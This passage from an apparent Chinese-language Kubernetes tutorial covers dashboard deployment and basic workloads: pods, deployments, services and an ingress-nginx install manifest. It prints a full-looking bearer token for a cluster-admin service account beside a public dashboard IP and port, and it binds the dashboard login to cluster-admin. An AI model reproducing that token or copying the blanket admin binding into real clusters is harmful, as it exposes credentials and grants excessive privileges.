class="attr">allowPrivilegeEscalation:</span> <span class="literal">false</span></span><br><span class="line">            <span class="attr">readOnlyRootFilesystem:</span> <span class="literal">true</span></span><br><span class="line">            <span class="attr">runAsUser:</span> <span class="number">1001</span></span><br><span class="line">            <span class="attr">runAsGroup:</span> <span class="number">2001</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">kubernetes-dashboard-certs</span></span><br><span class="line">          <span class="attr">secret:</span></span><br><span class="line">            <span class="attr">secretName:</span> <span class="string">kubernetes-dashboard-certs</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tmp-volume</span></span><br><span class="line">          <span class="attr">emptyDir:</span> &#123;&#125;</span><br><span class="line">      <span class="attr">serviceAccountName:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">      <span class="attr">nodeSelector:</span></span><br><span class="line">        <span class="attr">&quot;kubernetes.io/os&quot;:</span> <span class="string">linux</span></span><br><span class="line">      <span class="comment"># Comment the following tolerations if Dashboard must not be deployed on master</span></span><br><span class="line">      <span class="attr">tolerations:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">node-role.kubernetes.io/master</span></span><br><span class="line">          <span class="attr">effect:</span> <span class="string">NoSchedule</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">dashboard-metrics-scraper</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">dashboard-metrics-scraper</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">8000</span></span><br><span class="line">      <span class="attr">targetPort:</span> <span class="number">8000</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">dashboard-metrics-scraper</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">k8s-app:</span> <span class="string">dashboard-metrics-scraper</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">dashboard-metrics-scraper</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">revisionHistoryLimit:</span> <span class="number">10</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">k8s-app:</span> <span class="string">dashboard-metrics-scraper</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">k8s-app:</span> <span class="string">dashboard-metrics-scraper</span></span><br><span class="line">      <span class="attr">annotations:</span></span><br><span class="line">        <span class="attr">seccomp.security.alpha.kubernetes.io/pod:</span> <span class="string">&#x27;runtime/default&#x27;</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">dashboard-metrics-scraper</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">kubernetesui/metrics-scraper:v1.0.6</span></span><br><span class="line">          <span class="attr">ports:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">8000</span></span><br><span class="line">              <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">          <span class="attr">livenessProbe:</span></span><br><span class="line">            <span class="attr">httpGet:</span></span><br><span class="line">              <span class="attr">scheme:</span> <span class="string">HTTP</span></span><br><span class="line">              <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">              <span class="attr">port:</span> <span class="number">8000</span></span><br><span class="line">            <span class="attr">initialDelaySeconds:</span> <span class="number">30</span></span><br><span class="line">            <span class="attr">timeoutSeconds:</span> <span class="number">30</span></span><br><span class="line">          <span class="attr">volumeMounts:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/tmp</span></span><br><span class="line">            <span class="attr">name:</span> <span class="string">tmp-volume</span></span><br><span class="line">          <span class="attr">securityContext:</span></span><br><span class="line">            <span class="attr">allowPrivilegeEscalation:</span> <span class="literal">false</span></span><br><span class="line">            <span class="attr">readOnlyRootFilesystem:</span> <span class="literal">true</span></span><br><span class="line">            <span class="attr">runAsUser:</span> <span class="number">1001</span></span><br><span class="line">            <span class="attr">runAsGroup:</span> <span class="number">2001</span></span><br><span class="line">      <span class="attr">serviceAccountName:</span> <span class="string">kubernetes-dashboard</span></span><br><span class="line">      <span class="attr">nodeSelector:</span></span><br><span class="line">        <span class="attr">&quot;kubernetes.io/os&quot;:</span> <span class="string">linux</span></span><br><span class="line">      <span class="comment"># Comment the following tolerations if Dashboard must not be deployed on master</span></span><br><span class="line">      <span class="attr">tolerations:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">node-role.kubernetes.io/master</span></span><br><span class="line">          <span class="attr">effect:</span> <span class="string">NoSchedule</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tmp-volume</span></span><br><span class="line">          <span class="attr">emptyDir:</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ⅱ设置访问端口"><a href="#Ⅱ设置访问端口" class="headerlink" title="Ⅱ设置访问端口"></a>Ⅱ设置访问端口</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl edit svc kubernetes-dashboard -n kubernetes-dashboard</span><br></pre></td></tr></table></figure>

<p><code>type: ClusterIP 改为 type: NodePort</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl get svc -A |grep kubernetes-dashboard</span><br><span class="line"><span class="comment">## 找到端口，在安全组放行</span></span><br></pre></td></tr></table></figure>

<p><code>访问： https://集群任意IP:端口      https://139.198.165.238:32759</code></p>
<h6 id="Ⅲ、创建访问账号"><a href="#Ⅲ、创建访问账号" class="headerlink" title="Ⅲ、创建访问账号"></a>Ⅲ、创建访问账号</h6><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建访问账号，准备一个yaml文件； vi dash.yaml</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  name: admin-user</span><br><span class="line">  namespace: kubernetes-dashboard</span><br><span class="line">---</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: ClusterRoleBinding</span><br><span class="line">metadata:</span><br><span class="line">  name: admin-user</span><br><span class="line">roleRef:</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: ClusterRole</span><br><span class="line">  name: cluster-admin</span><br><span class="line">subjects:</span><br><span class="line">- kind: ServiceAccount</span><br><span class="line">  name: admin-user</span><br><span class="line">  namespace: kubernetes-dashboard</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl apply -f dash.yaml</span><br></pre></td></tr></table></figure>

<h6 id="Ⅳ令牌访问"><a href="#Ⅳ令牌访问" class="headerlink" title="Ⅳ令牌访问"></a>Ⅳ令牌访问</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#获取访问令牌</span><br><span class="line">kubectl -n kubernetes-dashboard get secret $(kubectl -n kubernetes-dashboard get sa/admin-user -o jsonpath=&quot;&#123;.secrets[0].name&#125;&quot;) -o go-template=&quot;&#123;&#123;.data.token | base64decode&#125;&#125;&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJSUzI1NiIsImtpZCI6InpXSkU0TjhCUmVKQzBJaC03Nk9ES2NMZ1daRTRmQ1FMZU9rRUJ3VXRnM3MifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi11c2VyLXRva2VuLXgyczhmIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFkbWluLXVzZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIzOTZmYjdlNS0wMjA2LTQxMjctOGQzYS0xMzRlODVmYjU0MDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQ6YWRtaW4tdXNlciJ9.Hf5mhl35_R0iBfBW7fF198h_klEnN6pRKfk_roAzOtAN-Aq21E4804PUhe9Rr9e_uFzLfoFDXacjJrHCuhiML8lpHIfJLK_vSD2pZNaYc2NWZq2Mso-BMGpObxGA23hW0nLQ5gCxlnxIAcyE76aYTAB6U8PxpvtVdgUknBVrwXG8UC_D8kHm9PTwa9jgbZfSYAfhOHWmZxNYo7CF2sHH-AT_WmIE8xLmB7J11vDzaunv92xoUoI0ju7OBA2WRr61bOmSd8WJgLCDcyBblxz4Wa-3zghfKlp0Rgb8l56AAI7ML_snF59X6JqaCuAcCJjIu0FUTS5DuyIObEeXY-z-Rw</span><br></pre></td></tr></table></figure>

<h6 id="Ⅴ界面"><a href="#Ⅴ界面" class="headerlink" title="Ⅴ界面"></a>Ⅴ界面</h6><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1613913/1625476485187-1893393c-5e0b-4d0a-ab57-e403b3a714dd.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_54,text_YXRndWlndS5jb20gIOWwmuehheiwtw==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="image.png"></p>
<h2 id="Kubernetes核心实战"><a href="#Kubernetes核心实战" class="headerlink" title="Kubernetes核心实战"></a><strong>Kubernetes核心实战</strong></h2><h3 id="一-资源创建方式"><a href="#一-资源创建方式" class="headerlink" title="一.资源创建方式"></a>一.资源创建方式</h3><ul>
<li>命令行</li>
<li>YAML</li>
</ul>
<h3 id="二-Namespace"><a href="#二-Namespace" class="headerlink" title="二.Namespace"></a>二.Namespace</h3><p><code>名称空间用来隔离资源</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl create ns hello</span><br><span class="line">kubectl delete ns hello</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Namespace</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">hello</span></span><br></pre></td></tr></table></figure>

<h3 id="三-pod"><a href="#三-pod" class="headerlink" title="三.pod"></a>三.pod</h3><p>&#96;运行中的一组容器，Pod是kubernetes中应用的最小单位.</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1613913/1625484036923-09a15ef3-33dc-4e29-91e4-e7fbc69070ce.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_28,text_YXRndWlndS5jb20gIOWwmuehheiwtw==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl run mynginx --image=nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看default名称空间的Pod</span></span><br><span class="line">kubectl get pod </span><br><span class="line"><span class="comment"># 描述</span></span><br><span class="line">kubectl describe pod 你自己的Pod名字</span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line">kubectl delete pod Pod名字</span><br><span class="line"><span class="comment"># 查看Pod的运行日志</span></span><br><span class="line">kubectl logs Pod名字</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每个Pod - k8s都会分配一个ip</span></span><br><span class="line">kubectl get pod -owide</span><br><span class="line"><span class="comment"># 使用Pod的ip+pod里面运行容器的端口</span></span><br><span class="line">curl 192.168.169.136</span><br><span class="line"></span><br><span class="line"><span class="comment"># 集群中的任意一个机器以及任意的应用都能通过Pod分配的ip来访问这个Pod</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">run:</span> <span class="string">mynginx</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">mynginx</span></span><br><span class="line"><span class="comment">#  namespace: default</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">mynginx</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span> </span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">run:</span> <span class="string">myapp</span> </span><br><span class="line">  <span class="attr">name:</span> <span class="string">myapp</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="string">containers</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">tomcat:8.5.68</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">tomcat</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1613913/1625553938232-51976552-5bab-4c98-bb8d-c4bf612bf866.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_15,text_YXRndWlndS5jb20gIOWwmuehheiwtw==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="image.png"></p>
<p><code>此时的应用还不能外部访问</code></p>
<h3 id="四-Deployment"><a href="#四-Deployment" class="headerlink" title="四.Deployment"></a>四.Deployment</h3><p><code>控制Pod，使Pod拥有多副本，自愈，扩缩容等能力</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 清除所有Pod，比较下面两个命令有何不同效果？</span></span><br><span class="line">kubectl run mynginx --image=nginx</span><br><span class="line"></span><br><span class="line">kubectl create deployment mytomcat --image=tomcat:8.5.68</span><br><span class="line"><span class="comment"># 自愈能力</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="1-多副本"><a href="#1-多副本" class="headerlink" title="1.多副本"></a>1.多副本</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl create deployment my-dep --image=nginx --replicas=3</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">my-dep</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">my-dep</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">3</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">my-dep</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">my-dep</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">nginx</span></span><br></pre></td></tr></table></figure>

<h4 id="2-扩缩容"><a href="#2-扩缩容" class="headerlink" title="2.扩缩容"></a>2.扩缩容</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kubectl scale --replicas=5 deployment/my-dep</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl edit deployment my-dep</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改replicas</span></span><br></pre></td></tr></table></figure>

<h4 id="3-自愈-故障转移"><a href="#3-自愈-故障转移" class="headerlink" title="3.自愈&amp;故障转移"></a>3.自愈&amp;故障转移</h4><ul>
<li>停机</li>
<li>删除Pod</li>
<li>容器崩溃</li>
</ul>
<h4 id="4-滚动更新"><a href="#4-滚动更新" class="headerlink" title="4.滚动更新"></a>4.滚动更新</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">kubectl <span class="built_in">set</span> image deployment/my-dep nginx=nginx:1.16.1 --record</span><br><span class="line">kubectl rollout status deployment/my-dep</span><br></pre></td></tr></table></figure>

<h4 id="5-版本回退"><a href="#5-版本回退" class="headerlink" title="5.版本回退"></a>5.版本回退</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#历史记录</span></span><br><span class="line">kubectl rollout <span class="built_in">history</span> deployment/my-dep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看某个历史详情</span></span><br><span class="line">kubectl rollout <span class="built_in">history</span> deployment/my-dep --revision=2</span><br><span class="line"></span><br><span class="line"><span class="comment">#回滚(回到上次)</span></span><br><span class="line">kubectl rollout undo deployment/my-dep</span><br><span class="line"></span><br><span class="line"><span class="comment">#回滚(回到指定版本)</span></span><br><span class="line">kubectl rollout undo deployment/my-dep --to-revision=2</span><br></pre></td></tr></table></figure>

<p>更多：</p>
<p>除了Deployment，k8s还有 <code>StatefulSet</code> 、<code>DaemonSet</code> 、<code>Job</code>  等 类型资源。我们都称为 <code>工作负载</code>。</p>
<p>有状态应用使用  <code>StatefulSet</code>  部署，无状态应用使用 <code>Deployment</code> 部署</p>
<p><a href="https://kubernetes.io/zh/docs/concepts/workloads/controllers/">https://kubernetes.io/zh/docs/concepts/workloads/controllers/</a></p>
<h3 id="五-Service"><a href="#五-Service" class="headerlink" title="五.Service"></a>五.Service</h3><p><code>将一组Pod公开为网络服务的抽象方法</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#暴露Deploy</span></span><br><span class="line">kubectl expose deployment my-dep --port=8000 --target-port=80</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用标签检索Pod</span></span><br><span class="line">kubectl get pod -l app=my-dep</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">my-dep</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">my-dep</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">my-dep</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">8000</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<h4 id="1、ClusterIP"><a href="#1、ClusterIP" class="headerlink" title="1、ClusterIP"></a>1、ClusterIP</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 等同于没有--type的</span></span><br><span class="line">kubectl expose deployment my-dep --port=8000 --target-port=80 --<span class="built_in">type</span>=ClusterIP</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">my-dep</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">my-dep</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">8000</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">80</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">my-dep</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">ClusterIP</span></span><br></pre></td></tr></table></figure>

<h4 id="2-NodePort"><a href="#2-NodePort" class="headerlink" title="2,NodePort"></a>2,NodePort</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kubectl expose deployment my-dep --port=8000 --target-port=80 --<span class="built_in">type</span>=NodePort</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">my-dep</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">my-dep</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">port:</span> <span class="number">8000</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">TCP</span></span><br><span class="line">    <span class="attr">targetPort:</span> <span class="number">80</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">my-dep</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">NodePort</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>NodePort范围在 30000-32767 之间</code></p>
<h3 id="六-Ingress"><a href="#六-Ingress" class="headerlink" title="六.Ingress"></a>六.Ingress</h3><h4 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v0.47.0/deploy/static/provider/baremetal/deploy.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改镜像</span></span><br><span class="line">vi deploy.yaml</span><br><span class="line"><span class="comment">#将image的值改为如下值：</span></span><br><span class="line">registry.cn-hangzhou.aliyuncs.com/lfy_k8s_images/ingress-nginx-controller:v0.46.0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查安装的结果</span></span><br><span class="line">kubectl get pod,svc -n ingress-nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最后别忘记把svc暴露的端口要放行</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1613913/1631010459687-252bb01e-e532-4992-830b-c097cddf9935.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_49,text_YXRndWlndS5jb20gIOWwmuehheiwtw==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10" alt="img"></p>
<p><code>如果下载不到，用以下文件</code></p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Namespace</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line"></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Source: ingress-nginx/templates/controller-serviceaccount.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">controller</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="attr">automountServiceAccountToken:</span> <span class="literal">true</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Source: ingress-nginx/templates/controller-configmap.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ConfigMap</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/component:</span> <span class="string">controller</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx-controller</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="comment"># Source: ingress-nginx/templates/clusterrole.yaml</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">helm.sh/chart:</span> <span class="string">ingress-nginx-3.33.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/name:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/instance:</span> <span class="string">ingress-nginx</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/version:</span> <span class="number">0.47</span><span class="number">.0</span></span><br><span class="line">    <span class="attr">app.kubernetes.io/managed-by:</span> <span class="string">Helm</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">ingress-nginx</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">configmaps</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">endpoints</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">nodes</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">pods</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">secrets</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">list</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">watch</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="attr">resources:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">nodes</span></span><br><span class="line">    <span class="attr">verbs:</span></span><br><span class="line">      <span class="bullet">-</span> <span 